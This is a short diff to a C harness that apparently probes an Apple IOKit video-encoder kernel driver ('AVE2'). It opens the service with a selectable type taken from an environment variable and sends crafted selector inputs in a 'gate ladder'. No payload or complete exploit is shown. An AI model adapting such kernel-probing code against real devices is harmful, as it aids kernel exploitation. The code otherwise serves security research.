@@ -49,13 +49,14 @@ static uint8_t  stat_in[0x1a0c0];
 static uint8_t  anon_in[0x1a0c0];
 static uint8_t  in[0x6f0];
 static uint8_t  out[0x400];
+static int g_opentype = 1;
 static uint64_t counter = 0x0000700000004005ULL;
 static void apply_patch(uint8_t *buf, const char *spec); /* fwd: used by create_session */
 static io_service_t svc;
 
 static kern_return_t create_session(int mode, io_connect_t *conn) {
     *conn = MACH_PORT_NULL;
-    kern_return_t kr = p_IOServiceOpen(svc, mach_task_self(), 1, conn);
+    kern_return_t kr = p_IOServiceOpen(svc, mach_task_self(), g_opentype, conn);
     if (kr != 0) { printf("    open fail 0x%08x\n", kr); return kr; }
     memset(in, 0, AVE2_IOS_CREATE_IN_SIZE);
     *(uint64_t *)(in + 0x08) = 0x4142434445464748ULL;
@@ -149,6 +150,7 @@ int main(void) {
     if (!svc) { printf("[-] no service\n"); return 1; }
     const char *e = getenv("AVE2_LOGCNT");
     if (e != NULL && e[0]) counter = strtoull(e, NULL, 0);
+    g_opentype = getenv("AVE2_OPENTYPE") ? atoi(getenv("AVE2_OPENTYPE")) : 1;
     void *anon = mmap(NULL, sizeof(anon_in), PROT_READ | PROT_WRITE,
                       MAP_ANON | MAP_PRIVATE, -1, 0);
     if (anon == MAP_FAILED) { printf("[-] mmap\n"); return 4; }
@@ -180,7 +182,7 @@ int main(void) {
         for (int i = 0; i < repeat; i++) {
             printf("--- rep %d ---\n", i);
             if (no_create) {
-                if (p_IOServiceOpen(svc, mach_task_self(), 1, &c) != 0) { printf("[-] open\n"); break; }
+                if (p_IOServiceOpen(svc, mach_task_self(), g_opentype, &c) != 0) { printf("[-] open\n"); break; }
             } else {
                 if (create_session(mode, &c) != 0) break;
             }
@@ -202,7 +204,7 @@ int main(void) {
             destroy_close(c);
         }
         printf("\n=== S5 no create: gate ladder ===\n");
-        if (p_IOServiceOpen(svc, mach_task_self(), 1, &c) == 0) {
+        if (p_IOServiceOpen(svc, mach_task_self(), g_opentype, &c) == 0) {
             fill_cfg(0, 1920, 1080, 2, 0, 0, 0); sel4_p("S5/P6e0", c, 0, 0x38, NULL);
             fill_cfg(0, 1920, 1080, 2, 0, 0, 0); sel4_p("S5/P7e0", c, 0, 0x28, NULL);
             fill_cfg(0, 1920, 1080, 2, 1, 0, 0); sel4_p("S5/P6e1", c, 0, 0x38, NULL);
